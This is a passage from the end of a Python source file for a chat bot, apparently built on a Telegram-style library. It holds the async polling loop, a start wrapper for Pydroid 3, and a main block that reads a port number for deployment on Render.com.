    await application.initialize()
    await application.start()
    
    try:
        await application.updater.start_polling()
        # Keep the bot running
        while True:
            await asyncio.sleep(3600)  # Sleep for 1 hour
    except asyncio.CancelledError:
        pass
    finally:
        await application.stop()
        await application.shutdown()

def start_bot():
    """Start the bot for Pydroid 3 compatibility"""
    try:
        # Create a new event loop for Pydroid
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Run the bot
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Bot crashed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    print(f"🤖 {BOT_INFO['name']} v{BOT_INFO['version']}")
    
    # For Render.com compatibility
    port = int(os.environ.get('PORT', 8080))
    print(f"🌐 Starting on port: {port}")
    
    start_bot()